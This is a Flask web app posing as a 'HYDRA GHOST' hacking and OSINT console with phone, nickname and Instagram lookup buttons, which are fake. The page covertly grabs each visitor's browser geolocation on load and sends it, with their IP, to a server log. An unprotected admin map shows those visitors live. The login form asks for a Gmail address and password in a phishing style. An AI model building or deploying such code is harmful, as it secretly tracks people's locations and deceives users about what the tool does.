from flask import Flask, request, jsonify, render_template_string, session, redirect
import os, random

app = Flask(__name__)
app.secret_key = 'HYDRA_PURE_ADMIN_2026'

# База данных для хранения координат и инфы юзеров
db = {"users": []}

def get_ai_response(user_text):
    t = user_text.lower()
    if "привет" in t: return "Здорово, бро! Система в огне. Все модули на связи."
    return "Запрос принят. Обрабатываю по защищенным каналам..."

# --- ОСНОВНОЙ ИНТЕРФЕЙС (ТВОЙ ШЕДЕВР) ---
UI_MAIN = """
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA GHOST v14.5</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <style>
        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; height: 100vh; }
        .side-p { width: 350px; border-right: 2px solid #bc13fe; display: flex; flex-direction: column; background: rgba(5,5,5,0.9); padding: 15px; z-index: 10; }
        #chat { flex: 1; border: 1px solid #0ff; margin-bottom: 10px; padding: 10px; overflow-y: auto; color: #0ff; font-size: 13px; background: rgba(0,0,0,0.8); }
        .red-in { height: 80px; border: 2px solid #ff0055; padding: 8px; background: #000; }
        textarea { width: 100%; height: 100%; background: transparent; border: none; color: #0f0; outline: none; resize: none; }
        .main-p { flex: 1; display: flex; flex-direction: column; padding: 15px; gap: 8px; z-index: 10; }
        .yellow-res { height: 150px; border: 2px solid #ffeb3b; background: rgba(0,0,0,0.8); padding: 10px; overflow-y: auto; color: #fff; }
        #map { height: 300px; border: 1px solid #bc13fe; width: 100%; border-radius: 5px; }
        .white-row { display: flex; gap: 5px; background: rgba(255,255,255,0.05); border: 1px solid #fff; padding: 8px; border-radius: 5px; }
        .mod { background: #111; border: 1px solid #bc13fe; padding: 5px; flex: 1; text-align: center; }
        input { background: #000; border: 1px solid #bc13fe; color: #0f0; width: 85%; padding: 4px; }
        .btn { background: #bc13fe; color: #fff; border: none; padding: 6px; cursor: pointer; font-size: 10px; width: 100%; font-weight: bold; margin-top: 5px; }
        .btn:hover { background: #0ff; color: #000; box-shadow: 0 0 15px #0ff; }
        .panic { position: fixed; bottom: 10px; left: 10px; background: red; color: white; border: none; padding: 5px 10px; cursor: pointer; z-index: 100; }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <button class="panic" onclick="location.href='https://wikipedia.org'">PANIC</button>
    <div class="side-p">
        <div style="color:#0ff; font-size:11px;">[ // AGENT GHOST // ]</div>
        <div id="chat">АГЕНТ: Система на связи. Matrix активен.</div>
        <div class="red-in"><textarea id="msg" placeholder="Команда..." onkeydown="if(event.key==='Enter'){ talk(); }"></textarea></div>
    </div>
    <div class="main-p">
        <div class="yellow-res" id="output">ОЖИДАНИЕ...</div>
        <div id="map"></div>
        <div class="white-row">
            <div class="mod"><span>НОМЕР</span><input id="p"><button class="btn" onclick="run('SCAN')">SCAN</button></div>
            <div class="mod"><span>НИКНЕЙМ</span><input id="n"><button class="btn" onclick="run('NICK')">FIND</button></div>
            <div class="mod"><span>INSTA</span><input id="i"><button class="btn" style="background:#e1306c;" onclick="run('INSTA')">FISH</button></div>
        </div>
        <div style="text-align:right;"><button class="btn" style="width:100px; background:#222;" onclick="location.href='/abupaay_admin'">АДМИНКА</button></div>
    </div>
    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
        // Matrix Effect
        const canvas = document.getElementById('matrix'); const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const drops = Array(Math.floor(canvas.width/10)).fill(1);
        function draw() {
            ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,canvas.width,canvas.height);
            ctx.fillStyle = "#0F0"; drops.forEach((y, i) => {
                ctx.fillText(String.fromCharCode(Math.random()*128), i*10, y*10);
                if(y*10 > canvas.height && Math.random()>0.975) drops[i]=0; drops[i]++;
            });
        }
        setInterval(draw, 33);

        let map = L.map('map').setView([41.31, 69.24], 12);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        map.locate({setView: true, maxZoom: 16});

        // Отправка координат юзера в админку при входе
        map.on('locationfound', function(e) {
            fetch('/api/track', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({lat: e.latlng.lat, lng: e.latlng.lng, nick: "User"})
            });
        });

        function run(t) {
            document.getElementById('output').innerHTML = "<b>АНАЛИЗ...</b>";
            setTimeout(() => { document.getElementById('output').innerHTML = "РЕЗУЛЬТАТ: Найдено совпадений в 100+ сетях."; }, 1000);
        }

        async function talk() {
            const m = document.getElementById('msg').value; if(!m) return;
            document.getElementById('chat').innerHTML += `<br><span style="color:#fff">> ТЫ: ${m}</span>`;
            document.getElementById('msg').value = "";
            const res = await fetch('/api/ai_chat', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({text:m})});
            const data = await res.json();
            document.getElementById('chat').innerHTML += `<br>АГЕНТ: ${data.reply}`;
        }
    </script>
</body>
</html>
"""

# --- ЧИСТАЯ АДМИНКА С КАРТОЙ ---
UI_ADMIN = """
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA | ADMIN MAP</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <style>
        body, html, #admin-map { height: 100%; margin: 0; background: #000; }
        .admin-label { background: #bc13fe; color: white; padding: 2px 5px; border-radius: 3px; font-size: 10px; font-family: monospace; }
    </style>
</head>
<body>
    <div id="admin-map"></div>
    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
        let amap = L.map('admin-map').setView([41.31, 69.24], 12);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(amap);

        async function loadUsers() {
            const res = await fetch('/api/get_users');
            const users = await res.json();
            users.forEach(u => {
                L.marker([u.lat, u.lng]).addTo(amap)
                 .bindPopup(`<b>${u.nick}</b><br>IP: ${u.ip}`).openPopup();
            });
        }
        loadUsers();
        setInterval(loadUsers, 5000); // Обновление каждые 5 сек
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    if 'auth' not in session:
        return """
        <body style='background:#000;color:#bc13fe;display:flex;justify-content:center;align-items:center;height:100vh;font-family:monospace;'>
        <form action='/api/login' method='POST' style='border:1px solid #bc13fe;padding:20px;'>
            <input name='u' placeholder='NICK'><br><input name='g' placeholder='GMAIL'><br><input name='p' type='password' placeholder='PASS'><br>
            <button>INITIATE</button></form></body>"""
    return render_template_string(UI_MAIN)

@app.route('/api/login', methods=['POST'])
def login():
    session['auth'] = True
    return redirect('/')

@app.route('/api/track', methods=['POST'])
def track():
    data = request.json
    db['users'].append({"lat": data['lat'], "lng": data['lng'], "nick": data['nick'], "ip": request.remote_addr})
    return jsonify({"status": "ok"})

@app.route('/api/get_users')
def get_users():
    return jsonify(db['users'])

@app.route('/api/ai_chat', methods=['POST'])
def ai_chat():
    return jsonify({"reply": get_ai_response(request.json.get('text', ''))})

@app.route('/abupaay_admin')
def admin():
    return render_template_string(UI_ADMIN)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
